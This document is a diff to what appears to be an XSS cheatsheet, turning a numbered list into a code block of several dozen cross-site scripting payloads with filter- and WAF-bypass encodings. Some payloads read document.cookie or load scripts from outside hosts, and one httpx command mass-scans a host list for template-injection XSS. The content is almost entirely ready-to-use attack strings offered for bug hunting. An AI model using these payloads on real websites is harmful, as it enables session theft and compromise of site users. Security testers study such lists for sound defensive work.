@@ -1,95 +1,87 @@
 	Check this AwesomeXSS github": - https://github.com/s0md3v/AwesomeXSS
 	=====================================================================
-	---------------
-	| XXS Payload | Cross-Site Scripting (XSS) Cheatsheet
-	---------------------------------------------------------------------
+##     XXS Payload | Cross-Site Scripting (XSS) Cheatsheet
+```javascript
+'"></title></script><img src=x onerror=confirm(1)>
+
+<xml:namespace prefix="t">
+<svg><style>&lt;img/src=x onerror=alert(document.domain)// </b>
+
+"><svg/onload=alert(document.domain)>"
+
+“><img src=x onerror=prompt(0);>
+
+<marquee loop=1 width=0 onfinish=co\u006efirm(document.cookie)>XSS</marquee>
+
+${7*7}{{7*7}}"--></script><img/src=x onerror=';alert(0);'>
+
+<A/hREf="j%0aavas%09cript%0a:%09con%0afirm%0d``">z
+<d3"<"/onclick="1>[confirm``]"<">z
+<d3/onmouseenter=[2].find(confirm)>z
+<details open ontoggle=confirm()>
+<script y="><">/*<script* */prompt()</script
+<w="/x="y>"/ondblclick=`<`[confir\u006d``]>z
+<a href="javascript%26colon;alert(1)">click
+<a href=javas&#99;ript:alert(1)>click
+<script/"<a"/src=data:=".<a,[8].some(confirm)>
+<svg/x=">"/onload=confirm()//
+<--`<img/src=` onerror=confirm``> --!>
+<svg%0Aonload=%09((pro\u006dpt))()//
+<sCript x>(((confirm)))``</scRipt x>
+<svg </onload ="1> (_=prompt,_(1)) "">
+<!--><script src=//14.rs>
+<embed src=//14.rs>
+<script x=">" src=//15.rs></script>
+<!'/*"/*/'/*/"/*--></Script><Image SrcSet=K */; OnError=confirm`1` //>
+<iframe/src \/\/onload = prompt(1)
+<x oncut=alert()>x
+<svg onload=write()>
+"><script>alert(0);</script>
+""></script/><script/>(confirm)(1)
+
+%0ajavascript:`/*\"/*-->&lt;svg onload='/*</template></noembed></noscript></style></title></textarea></script><html onmouseover="/**/ alert()//'">`
 
 
-1-      '"></title></script><img src=x onerror=confirm(1)>
+<svg onload=alert(0)>
 
-2-	<xml:namespace prefix="t">
-	<svg><style>&lt;img/src=x onerror=alert(document.domain)// </b>
+'"()&%<acx><ScRiPt >alert(/openbugbounty/)</ScRiPt>
 
-3-	"><svg/onload=alert(document.domain)>"
-
-4-	“><img src=x onerror=prompt(0);>
-
-5- 	<marquee loop=1 width=0 onfinish=co\u006efirm(document.cookie)>XSS</marquee>
-
-6- 	${7*7}{{7*7}}"--></script><img/src=x onerror=';alert(0);'>
-
-7- 	<A/hREf="j%0aavas%09cript%0a:%09con%0afirm%0d``">z
-	<d3"<"/onclick="1>[confirm``]"<">z
-	<d3/onmouseenter=[2].find(confirm)>z
-	<details open ontoggle=confirm()>
-	<script y="><">/*<script* */prompt()</script
-	<w="/x="y>"/ondblclick=`<`[confir\u006d``]>z
-	<a href="javascript%26colon;alert(1)">click
-	<a href=javas&#99;ript:alert(1)>click
-	<script/"<a"/src=data:=".<a,[8].some(confirm)>
-	<svg/x=">"/onload=confirm()//
-	<--`<img/src=` onerror=confirm``> --!>
-	<svg%0Aonload=%09((pro\u006dpt))()//
-	<sCript x>(((confirm)))``</scRipt x>
-	<svg </onload ="1> (_=prompt,_(1)) "">
-	<!--><script src=//14.rs>
-	<embed src=//14.rs>
-	<script x=">" src=//15.rs></script>
-	<!'/*"/*/'/*/"/*--></Script><Image SrcSet=K */; OnError=confirm`1` //>
-	<iframe/src \/\/onload = prompt(1)
-	<x oncut=alert()>x
-	<svg onload=write()>
-	"><script>alert(0);</script>
-	""></script/><script/>(confirm)(1)
-
-8- 	%0ajavascript:`/*\"/*-->&lt;svg onload='/*</template></noembed></noscript></style></title></textarea></script><html onmouseover="/**/ alert()//'">`
+<style>@keyframes
+a{}b{animation:a;}</style><b/onanimationstart=prompt`${document.domain}&#x60;><d3v/onauxclick=[2].some(confirm)>click<marquee+loop=1+width=0+onfinish='new+Function`al\ert\`1\``'>
 
 
-9- 	<svg onload=alert(0)>
-
-10- 	'"()&%<acx><ScRiPt >alert(/openbugbounty/)</ScRiPt>
-
-11- 	<style>
-	@keyframes
- 	a{}b{animation:a;}</style>
-	<b/onanimationstart=prompt`${document.domain}&#x60;>
-	<d3v/onauxclick=[2].some(confirm)>click
-	<marquee+loop=1+width=0+onfinish='new+Function`al\ert\`1\``'>
+"--!><Svg/OnLoad=(confirm)(1)>"
 
 
-12- 	"--!><Svg/OnLoad=(confirm)(1)>"
+<<meh<meh>svg/onload=alert(1)>
 
+<details ontoggle=prompt()>
 
-13- 	<<meh<meh>svg/onload=alert(1)>
+script ~~~>alert(0%0)</script ~~~>
+<style/onload=&lt;!--&#09;&gt;&#10;alert&#10;&lpar;1&rpar;>
+<svg><style>'<body/onload=confirm(1)>'
+<iframe/%00/ src=javaSCRIPT&colon;alert(/hhhh/)
+//<form/action=javascript&#x3A;alert&lpar;document&period;cookie&rpar;><input/type='submit'>//
+	
+"onmouseover="confirm/()"//
+If your payload in string tag like : value="alexa" 
+	you can simple alert by onmouseover - payload to alert xss
+		"onmouseover="alert(1)
 
-14- 	<details ontoggle=prompt()>
-
-15- 	script ~~~>alert(0%0)</script ~~~>
-	<style/onload=&lt;!--&#09;&gt;&#10;alert&#10;&lpar;1&rpar;>
-	<svg><style>'<body/onload=confirm(1)>'
-	<iframe/%00/ src=javaSCRIPT&colon;alert(/hhhh/)
-	//<form/action=javascript&#x3A;alert&lpar;document&period;cookie&rpar;><input/type='submit'>//
+<a href=“JavaScript:alert(1)”>test</a>	
+	
+cat hosts | httpx -nc -t 300 -p 80,443,8080,8443 -silent -path "/?name={{this.constructor.constructor('alert(\"foo\")')()}}" -mr "name={{this.constructor.constructor('alert(" 
 	
 	
-16- 	"onmouseover="confirm/()"//
-		If your payload in string tag like : value="alexa" 
-			you can simple alert by onmouseover - payload to alert xss
-			"onmouseover="alert(1)
-
-17- 	<a href=“JavaScript:alert(1)”>test</a>	
-	
-18-	cat hosts | httpx -nc -t 300 -p 80,443,8080,8443 -silent -path "/?name={{this.constructor.constructor('alert(\"foo\")')()}}" -mr "name={{this.constructor.constructor('alert(" 
-	
-	
-19- 	A nice one from @garethheyes
+A nice one from @garethheyes
 	eval([,]+'ale'+[,]+[,]+'rt(1)'+[,])
 	
-20- 	" onload="alert(1)
-21- 	<xml onreadystatechange=alert(1)>
+" onload="alert(1)
+<xml onreadystatechange=alert(1)>
 
-22- 	<sc%00ript/test='asdf'/te%00st2='asdf'>alert/**/(1)</script>
+<sc%00ript/test='asdf'/te%00st2='asdf'>alert/**/(1)</script>
 
-
+```
 
 	--------------------------------------------------------------------
 	XSS Locators:
@@ -181,7 +173,7 @@
 	
 
 =======================================================
-``` 				Restriction Bypass						
+				Restriction Bypass						
 =======================================================
 
 	--------------------------------------------------------------------
@@ -256,7 +248,7 @@ Encoding									  |
 	--------------------------------------------------------------------	
 
 ================================================
-						WAF
+		WAF Bypass
 ================================================
 	Akamai:
 	---------
